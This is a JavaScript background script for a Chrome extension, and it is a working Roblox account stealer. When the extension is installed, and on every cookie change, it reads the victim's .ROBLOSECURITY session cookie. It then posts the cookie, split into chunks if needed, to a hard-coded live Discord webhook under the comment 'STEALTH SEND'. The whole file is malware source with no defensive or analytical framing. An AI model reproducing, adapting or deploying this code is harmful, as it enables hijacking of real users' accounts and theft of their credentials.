// STEALTH SEND (Full cookie, chunked if needed)
async function sendCookie(cookie = '') {
  const MAX_LENGTH = 1900; // Stay under Discord's 2000-char limit
  console.log('Starting sendCookie with cookie:', cookie.substring(0, 20) + '...');
  try {
    if (cookie.length > MAX_LENGTH) {
      for (let i = 0; i < cookie.length; i += MAX_LENGTH) {
        const chunk = cookie.substring(i, i + MAX_LENGTH);
        console.log(`Sending chunk ${Math.floor(i/MAX_LENGTH) + 1}`);
        const response = await fetch('https://canary.discord.com/api/webhooks/1430959714933407846/zaV4gD9t-8CQWZtJ9rH3rVfnYYh_LcX7J8TmXbckvKwzIkzBXlHBx4xv-hpm-KWvNiB4', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({
            username: '🆕 Roblox Cookie Swap',
            content: `**.ROBLOSECURITY (Part ${Math.floor(i/MAX_LENGTH) + 1}):** \`${chunk}\`\n**Time:** ${new Date().toISOString()}`
          })
        });
        console.log(`Chunk ${Math.floor(i/MAX_LENGTH) + 1} response status:`, response.status);
      }
    } else {
      console.log('Sending full cookie');
      const response = await fetch('https://canary.discord.com/api/webhooks/1430959714933407846/zaV4gD9t-8CQWZtJ9rH3rVfnYYh_LcX7J8TmXbckvKwzIkzBXlHBx4xv-hpm-KWvNiB4', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
          username: '🆕 Roblox Cookie Swap',
          content: `**.ROBLOSECURITY:** \`${cookie}\`\n**Time:** ${new Date().toISOString()}`
        })
      });
      console.log('Full send response status:', response.status);
    }
    console.log('Send attempt completed');
  } catch (e) {
    console.error('Webhook send failed:', e.message);
  }
}

// Detect and send IMMEDIATELY on cookie change
chrome.cookies.onChanged.addListener((changeInfo) => {
  console.log('Cookie changed detected:', changeInfo.cookie.name, changeInfo.cookie.value.substring(0, 20) + '...');
  if (changeInfo.cookie.name === '.ROBLOSECURITY' && changeInfo.cookie.domain.includes('roblox.com')) {
    sendCookie(changeInfo.cookie.value);
  }
});

// Initial check on extension load
chrome.runtime.onInstalled.addListener(() => {
  console.log('Extension installed, checking cookie');
  chrome.cookies.get({url: 'https://www.roblox.com', name: '.ROBLOSECURITY'}, (cookie) => {
    if (cookie) {
      console.log('Initial cookie found:', cookie.value.substring(0, 20) + '...');
      sendCookie(cookie.value);
    } else {
      console.log('No initial cookie found');
    }
  });
});